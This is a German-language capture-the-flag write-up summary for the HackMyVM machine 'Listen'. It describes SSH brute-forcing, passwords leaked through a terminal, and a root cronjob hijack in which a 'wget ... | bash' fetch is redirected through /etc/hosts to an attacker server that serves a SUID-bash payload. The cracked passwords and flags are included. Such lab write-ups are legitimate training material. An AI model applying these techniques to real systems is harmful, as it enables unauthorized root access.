# Listen - HackMyVM (Medium)

![Listen.png](Listen.png)

## Übersicht

*   **VM:** Listen
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Listen)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 5. November 2022
*   **Original-Writeup:** https://alientec1908.github.io/Listen_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war es, Root-Rechte auf der Maschine "Listen" zu erlangen. Der initiale Zugriff erfolgte durch das Finden eines Passwort-Hashes für den Benutzer `leo` auf der Webseite der Maschine. Nach dem Knacken des Passworts wurde per SSH Zugriff als `leo` erlangt. Lateral Movement zu den Benutzern `silence` und `listen` war durch das Ausnutzen unsicherer Skripte und Passwort-Weitergabemechanismen möglich. Die finale Privilegieneskalation zu Root gelang durch das Hijacking eines Cronjobs, der als Root `wget` benutzte, um ein Skript von einem (manipulierbaren) Hostnamen herunterzuladen und direkt mit `bash` auszuführen.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `echo`
*   `hydra`
*   `ssh`
*   `file`
*   `python3` (`http.server` Modul)
*   `wget`
*   `ps`
*   `su`
*   `nano` / `vi`
*   Standard Linux-Befehle (`ls`, `cat`, `who`, `w`, `sh`, `cp`, `chmod`, `bash`, `id`, `cd`, etc.)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Listen" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Information Disclosure:**
    *   IP-Adresse des Ziels (192.168.2.111) mit `arp-scan` identifiziert.
    *   Ein erster `nmap`-Scan zeigte Port 22 (SSH) und 80 (HTTP) als `filtered`.
    *   `gobuster` auf Port 80 fand jedoch `index.html`.
    *   Im Quellcode von `index.html` wurde ein Passwort-Hash für den Benutzer `leo` im Shadow-Format (`$6$...`) und ein Gedicht gefunden, das als Hinweis auf das Passwort diente.

2.  **Credential Access & Initial Access (SSH als `leo`):**
    *   Mittels `hydra` wurde ein Brute-Force-Angriff auf den SSH-Dienst (Port 22) für den Benutzer `leo` mit einer auf dem Gedicht basierenden Wortliste durchgeführt. Das Passwort `contribute` wurde gefunden.
    *   Erfolgreicher SSH-Login als `leo` mit den gefundenen Credentials.

3.  **Privilege Escalation Vector Discovery & Lateral Movement (`leo` -> `silence` -> `listen`):**
    *   Im Home-Verzeichnis von `leo` wurde eine SUID/SGID-ELF-Datei namens `poem` gefunden.
    *   Die Prozessliste (`ps -ef`) offenbarte einen Cronjob, der als `root` minütlich `/home/listen/listentome.sh` ausführt, welches wiederum `wget -O - -q http://listen/ihearyou.sh | bash` ausführt.
    *   Lateral Movement zu `silence` mit dem Passwort `listentome` (Quelle des Passworts im Log unklar, vermutlich durch Analyse von `poem` oder anderem Leak).
    *   Im Home-Verzeichnis von `silence` fand sich die Datei `note.txt` (Hinweis auf `listen`'s Passwort) und `listen.sh`, ein Skript, das `/home/listen/password.txt` nach `/dev/pts/4` schreibt.
    *   Durch Beobachten von `/dev/pts/4` (auf dem `silence` angemeldet war) konnte das Passwort für `listen` (`shhhhhh`) ausgelesen werden, als `listen.sh` (vermutlich durch einen Cronjob von `listen`) ausgeführt wurde.
    *   Lateral Movement zu `listen` mit `su listen` und dem Passwort `shhhhhh`.
    *   Die User-Flag (`HMVimlistening`) wurde in `/home/listen/user.txt` gefunden.

4.  **Privilege Escalation (`listen` -> `root` via Cronjob Hijack):**
    *   Der zuvor identifizierte Root-Cronjob (`wget http://listen/ihearyou.sh | bash`) wurde ausgenutzt.
    *   Auf dem Angreifer-System wurde eine bösartige `ihearyou.sh`-Datei erstellt, die eine SUID-Bash-Kopie erstellt (`cp /bin/bash /tmp/bashroot; chmod +s /tmp/bashroot`).
    *   Ein Python-HTTP-Server wurde auf dem Angreifer-System auf Port 80 gestartet, um `ihearyou.sh` bereitzustellen.
    *   Auf dem Zielsystem wurde als Benutzer `listen` die Datei `/etc/hosts` bearbeitet (Schreibrechte hierfür sind ungewöhnlich für einen normalen Benutzer, aber im Writeup so durchgeführt), um den Hostnamen `listen` auf die IP-Adresse des Angreifer-Systems umzuleiten.
    *   Nachdem der Cronjob die Datei `ihearyou.sh` vom Angreifer-Server heruntergeladen und als Root ausgeführt hatte, wurde die SUID-Datei `/tmp/bashroot` erstellt.
    *   Als Benutzer `listen` wurde `/tmp/bashroot -p` ausgeführt, was aufgrund des SUID-Bits eine Root-Shell lieferte.
    *   Die Root-Flag (`HMVthxforlisten`) wurde in `/root/root.txt` gefunden.

## Wichtige Schwachstellen und Konzepte

*   **Information Disclosure (Passwort-Hash auf Webseite):** Ein Passwort-Hash und ein Hinweis auf das Passwort waren öffentlich auf der Webseite zugänglich.
*   **Schwache Passwörter:** Das Passwort für `leo` konnte durch Brute-Force erraten werden.
*   **Unsichere Skripte und Passwort-Weitergabe:** Skripte, die Passwörter im Klartext speicherten oder an unsichere Orte (wie TTYs) schrieben, ermöglichten Lateral Movement.
*   **Cronjob Hijacking (`wget | bash`):** Ein als Root laufender Cronjob lud ein Skript über HTTP von einem Hostnamen herunter und führte es direkt mit `bash` aus. Durch Manipulation der DNS-Auflösung (hier: `/etc/hosts`-Datei) und Bereitstellung eines bösartigen Skripts konnte Code als Root ausgeführt werden.
*   **SUID/SGID Binary:** Die Datei `poem` hatte SUID/SGID-Bits, was einen potenziellen, wenn auch nicht final genutzten, Eskalationsvektor darstellte.
*   **Manipulierbare `/etc/hosts`-Datei:** Die Möglichkeit für den Benutzer `listen`, die `/etc/hosts`-Datei zu bearbeiten, war entscheidend für den Cronjob-Hijack.

## Flags

*   **User Flag (`/home/listen/user.txt`):** `HMVimlistening`
*   **Root Flag (`/root/root.txt`):** `HMVthxforlisten`

## Tags

`HackMyVM`, `Listen`, `Medium`, `Information Disclosure`, `Password Cracking`, `SSH`, `Cronjob Hijack`, `wget | bash`, `/etc/hosts manipulation`, `Lateral Movement`, `Linux`, `Privilege Escalation`
